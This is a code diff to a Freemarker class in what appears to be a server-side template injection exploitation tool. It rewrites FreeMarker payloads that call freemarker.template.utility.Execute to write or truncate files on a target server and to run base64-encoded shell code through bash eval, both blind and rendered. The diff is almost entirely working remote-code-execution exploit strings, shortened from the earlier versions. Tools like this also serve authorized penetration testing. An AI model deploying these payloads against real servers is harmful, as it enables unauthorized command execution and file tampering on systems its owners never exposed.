@@ -14,17 +14,17 @@ class Freemarker(java.Java):
             },
             'write': {
                 'call': 'inject',
-                'write': """<#assign ex="freemarker.template.utility.Execute"?new()>${{ ex("bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,--decode}}>>{path}") }}""",
-                'truncate': """<#assign ex="freemarker.template.utility.Execute"?new()>${{ ex("bash -c {{echo,-n,}}>{path}") }}""",
+                'write': """${{"freemarker.template.utility.Execute"?new()("bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}") }}""",
+                'truncate': """${{"freemarker.template.utility.Execute"?new()("bash -c {{echo,-n,}}>{path}") }}""",
             },
             # Not using execute here since it's rendered and requires set headers and trailers
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """<#assign ex="freemarker.template.utility.Execute"?new()>${{ ex("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}&&{{sleep,{delay}}}") }}"""
+                'execute_blind': """${{"freemarker.template.utility.Execute"?new()("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}") }}"""
             },
             'execute': {
                 'call': 'render',
-                'execute': """<#assign ex="freemarker.template.utility.Execute"?new()>${{ ex("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,--decode}})}}") }}"""
+                'execute': """${{"freemarker.template.utility.Execute"?new()("/bin/bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}") }}"""
             }
         })
 
